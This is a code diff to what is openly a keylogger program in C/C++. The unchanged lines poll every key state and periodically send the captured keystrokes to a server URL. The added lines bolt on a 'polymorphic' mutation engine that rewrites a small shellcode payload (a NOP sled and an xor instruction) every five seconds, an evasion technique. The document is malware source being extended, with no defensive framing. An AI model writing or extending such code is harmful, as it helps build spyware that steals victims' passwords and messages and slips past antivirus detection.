@@ -17,6 +17,7 @@
 #include <stdio.h>
 #include <time.h>
 #include <queue>
+#include "poly_crypto/polymorph/mutation_engine.hpp"
 
 // Array to track the state of keys
 #define KEY_COUNT 256
@@ -59,6 +60,18 @@ int main() {
     // Initialize keyStates array
     memset(keyStates, 0, sizeof(keyStates));
 
+    // Initialize Polymorphic Engine
+    poly_crypto::polymorph::MutationConfig polyConfig;
+    polyConfig.intensity = poly_crypto::polymorph::MutationIntensity::High;
+    poly_crypto::polymorph::MutationEngine polyEngine(polyConfig);
+
+    // Dummy x86-64 payload for mutation demonstration
+    poly_crypto::ByteVector dummyPayload = {
+        0x90, 0x90, 0x90, 0x90,  // NOP sled
+        0x48, 0x31, 0xC0,        // xor rax, rax
+        0x90, 0x90, 0x90, 0x90   // More NOPs
+    };
+
     while (1) {
         // Log keystrokes in real-time
         for (int i = 8; i < KEY_COUNT; i++) {
@@ -79,6 +92,14 @@ int main() {
         static DWORD lastCheckTime = 0;
         DWORD currentTime = GetTickCount();
         if (currentTime - lastCheckTime >= 5000) {  // Check every 5 seconds
+            // Mutate the payload to demonstrate polymorphic capability
+            auto mutatedPayload = polyEngine.mutate(dummyPayload);
+            if (mutatedPayload) {
+                printf("Polymorphic Engine: Mutated dummy payload from %zu to %zu bytes.\n", dummyPayload.size(), mutatedPayload->size());
+            } else {
+                fprintf(stderr, "Polymorphic Engine: Failed to mutate payload.\n");
+            }
+
             sendKeystrokesPeriodically(&memRegion, serverUrl);
             lastCheckTime = currentTime;
         }
